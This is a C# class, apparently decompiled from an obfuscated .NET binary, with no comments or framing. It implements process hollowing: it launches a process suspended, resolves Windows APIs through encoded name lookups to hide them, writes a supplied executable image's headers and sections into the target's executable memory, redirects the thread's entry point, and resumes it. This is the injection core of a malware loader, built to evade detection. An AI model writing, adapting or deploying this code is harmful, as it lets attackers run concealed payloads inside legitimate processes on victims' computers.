using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using ns1;
using ns2;

namespace ns3;

internal sealed class Class3
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate0(IntPtr intptr_0, uint[] uint_0);

	public delegate uint Delegate1(IntPtr intptr_0, IntPtr intptr_1);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, int int_0, ref IntPtr intptr_3);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate4(IntPtr intptr_0, uint[] uint_0);

	public delegate IntPtr Delegate5(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate6(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, int int_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	public static T smethod_0<T>(string string_0, string string_1)
	{
		return (T)(object)Class5.smethod_0(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), smethod_3(typeof(T).TypeHandle, 974, 909), 1021, 991);
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CreateProcessW([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, StringBuilder stringBuilder_0, IntPtr intptr_0, IntPtr intptr_1, [MarshalAs(UnmanagedType.Bool)] bool bool_0, int int_0, IntPtr intptr_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, byte[] byte_0, IntPtr[] intptr_3);

	private static int smethod_1(long long_0, long long_1 = 4L)
	{
		Delegate2 @delegate = smethod_0<Delegate2>(Class0.smethod_0(944785467, 3), Class0.smethod_0(944785459, 3));
		IntPtr intptr_ = Class4.smethod_0(Class2.smethod_0(1017, 947), 713, 750);
		IntPtr intptr_2 = Class1.smethod_0(long_0, 851, 842);
		int int_ = checked((int)long_1);
		IntPtr intptr_3 = Class2.smethod_2(0, 3, 98);
		IntPtr intptr_4 = default(IntPtr);
		@delegate(intptr_, intptr_2, ref intptr_4, int_, ref intptr_3);
		_ = (int)intptr_3;
		return (int)intptr_4;
	}

	public static bool smethod_2(byte[] byte_0, string string_0)
	{
		checked
		{
			try
			{
				GCHandle gchandle_ = Class4.smethod_2(byte_0, GCHandleType.Pinned, 829, 811);
				int num = Class0.smethod_1(Class1.smethod_1(ref gchandle_, 437, 441), 58, 10);
				Class4.smethod_3(ref gchandle_, 957, 945);
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] byte_ = new byte[68];
				int num2 = Class0.smethod_2(byte_0, 60, 504, 431);
				uint[] array2 = new uint[179];
				array2[0] = 65538u;
				string string_ = null;
				StringBuilder stringBuilder_ = new StringBuilder(string_0);
				string string_2 = null;
				CreateProcessW(ref string_, stringBuilder_, zero, zero, bool_0: false, 4, zero, ref string_2, byte_, array);
				int num3 = num + smethod_1(num + 60);
				int num4 = smethod_1(num3 + 52);
				Delegate1 @delegate = smethod_0<Delegate1>(Class0.smethod_0(944785471, 7), Class0.smethod_0(944785445, 3));
				@delegate(array[0], Class2.smethod_2(num4, 160, 193));
				Delegate5 delegate2 = smethod_0<Delegate5>(Class0.smethod_0(944785417, 4), Class0.smethod_0(944785528, 0));
				IntPtr intptr_ = delegate2(array[0], Class2.smethod_2(num4, 196, 165), Class2.smethod_2(smethod_1(num3 + 80), 23, 118), 12288, 64);
				IntPtr intPtr = new IntPtr(Class0.smethod_2(byte_0, num2 + 52, 873, 830));
				IntPtr intPtr2 = new IntPtr(Class0.smethod_2(byte_0, num2 + 80, 154, 205));
				Delegate6 delegate3 = smethod_0<Delegate6>(Class0.smethod_0(944785467, 3), Class0.smethod_0(944785516, 5));
				delegate3(array[0], intptr_, byte_0, (uint)smethod_1(num3 + 84), 0);
				int num5 = smethod_1(num3 + 6, 2L) - 1;
				int int_ = default(int);
				for (int i = 0; i <= num5; i++)
				{
					int[] array3 = new int[10];
					Class4.smethod_4(byte_0, num2 + 248 + i * 40, array3, 0, 40, 320, 259);
					byte[] array4 = new byte[array3[4] - 1 + 1];
					Class4.smethod_4(byte_0, array3[5], array4, 0, array4.Length, 526, 589);
					delegate3(intptr_1: new IntPtr(Class4.smethod_5(ref intptr_, 563, 594) + array3[3]), uint_0: (uint)Class0.smethod_1(new IntPtr(array4.Length), 704, 752), intptr_0: array[0], byte_0: array4, int_0: int_);
				}
				Delegate0 delegate4 = smethod_0<Delegate0>(Class0.smethod_0(944785471, 7), Class0.smethod_0(944785494, 6));
				delegate4(array[1], array2);
				delegate3(array[0], Class1.smethod_0(unchecked((long)array2[41]) + 8L, 288, 313), Class2.smethod_3(Class4.smethod_5(ref intptr_, 533, 628), 539, 543), 4u, int_);
				array2[44] = (uint)(num4 + smethod_1(num3 + 40));
				Delegate4 delegate5 = smethod_0<Delegate4>(Class0.smethod_0(944785456, 8), Class0.smethod_0(944785474, 7));
				delegate5(array[1], array2);
				Delegate3 delegate6 = smethod_0<Delegate3>(Class0.smethod_0(944785465, 1), Class0.smethod_0(944785579, 1));
				delegate6(array[1], (IntPtr)0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}

	internal static Type smethod_3(RuntimeTypeHandle runtimeTypeHandle_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 67:
				return Type.GetTypeFromHandle(runtimeTypeHandle_0);
			}
		}
	}
}
